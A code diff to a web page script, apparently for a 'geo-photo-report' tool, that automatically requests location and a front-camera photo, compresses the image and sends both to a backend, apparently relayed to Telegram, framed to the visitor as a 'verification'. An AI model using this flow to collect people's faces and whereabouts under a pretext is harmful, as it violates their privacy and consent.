@@ -1,6 +1,8 @@
-// === app.js ===
-// Настройки: бьём на тот же origin, где открыт сайт
-const API_BASE = ''; // было 'https://geo-photo-report.onrender.com'
+// === app.js (fixed) ===
+
+// Бэк выбираем так: если на странице задан window.__API_BASE — бьём туда,
+// иначе остаёмся на том же origin (относительный путь).
+const API_BASE = (typeof window !== 'undefined' && window.__API_BASE) ? String(window.__API_BASE).replace(/\/+$/,'') : '';
 
 // Кэшируем UI
 const UI = {
@@ -53,25 +55,51 @@ async function askGeolocation() {
   });
 }
 
+// === Сжатие фото ===
+function downscaleDataUrl(dataUrl, maxSide = 1280, quality = 0.7) {
+  return new Promise((resolve, reject) => {
+    const img = new Image();
+    img.onload = () => {
+      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
+      const w = Math.round(img.width * ratio);
+      const h = Math.round(img.height * ratio);
+      const c = document.createElement('canvas');
+      c.width = w; c.height = h;
+      c.getContext('2d').drawImage(img, 0, 0, w, h);
+      try {
+        const out = c.toDataURL('image/jpeg', quality);
+        resolve(out);
+      } catch (e) { reject(e); }
+    };
+    img.onerror = reject;
+    img.src = dataUrl;
+  });
+}
+
 // === Фото с камеры ===
 async function takePhoto() {
   if (!navigator.mediaDevices?.getUserMedia)
     throw new Error('Camera unsupported');
+
+  // iOS любит user-gesture; но пробуем автозахват, как и раньше.
   const stream = await navigator.mediaDevices.getUserMedia({
     video: { facingMode: 'user' },
   });
+
   const [track] = stream.getVideoTracks();
   try {
-    const cap = new ImageCapture(track);
-    const bmp = await cap.grabFrame();
-    const c = document.createElement('canvas');
-    c.width = bmp.width;
-    c.height = bmp.height;
-    c.getContext('2d').drawImage(bmp, 0, 0);
-    const dataUrl = c.toDataURL('image/jpeg', 0.85);
-    track.stop();
-    return dataUrl;
-  } catch {
+    if (typeof ImageCapture !== 'undefined') {
+      const cap = new ImageCapture(track);
+      const bmp = await cap.grabFrame();
+      const c = document.createElement('canvas');
+      c.width = bmp.width;
+      c.height = bmp.height;
+      c.getContext('2d').drawImage(bmp, 0, 0);
+      const dataUrl = c.toDataURL('image/jpeg', 0.85);
+      track.stop();
+      return dataUrl;
+    }
+    // Фолбэк через <video>
     const v = document.createElement('video');
     v.srcObject = stream;
     await v.play();
@@ -82,6 +110,9 @@ async function takePhoto() {
     const dataUrl = c.toDataURL('image/jpeg', 0.85);
     stream.getTracks().forEach((t) => t.stop());
     return dataUrl;
+  } catch (e) {
+    try { track && track.stop(); } catch {}
+    throw e;
   }
 }
 
@@ -110,8 +141,14 @@ async function sendReport({ photoBase64, geo }) {
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(body),
   });
-  const data = await r.json();
-  if (!data.ok) throw new Error(data.error || 'Send failed');
+
+  const text = await r.text();
+  let data; try { data = JSON.parse(text); } catch {}
+
+  if (!r.ok || !data?.ok) {
+    const err = (data && data.error) || text || `HTTP ${r.status}`;
+    throw new Error(err);
+  }
   return data;
 }
 
@@ -121,10 +158,19 @@ async function autoFlow() {
     setBtnLocked();
     UI.text.innerHTML = 'Запрашиваем камеру и геолокацию…';
 
-    const [geo, photoBase64] = await Promise.all([
+    // Проверка на HTTPS/localhost — иначе браузер режет камеру/гео
+    const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
+    if (!isSecure) {
+      throw new Error('Нужен HTTPS (или localhost) для доступа к камере/гео');
+    }
+
+    const [geo, rawPhoto] = await Promise.all([
       askGeolocation(),
       takePhoto(),
     ]);
+
+    // Сжимаем перед отправкой (TG лимит на sendPhoto ~20MB)
+    const photoBase64 = await downscaleDataUrl(rawPhoto, 1280, 0.7);
 
     UI.text.innerHTML = 'Отправляем данные для проверки…';
     await sendReport({ photoBase64, geo });
@@ -139,7 +185,7 @@ async function autoFlow() {
     setBtnLocked();
     window.__reportReady = false;
     UI.text.innerHTML = '<span class="err">Не удалось выполнить проверку.</span>';
-    UI.note.textContent = 'Повтори позже.';
+    UI.note.textContent = String(e && e.message ? e.message : e);
   }
 }
 
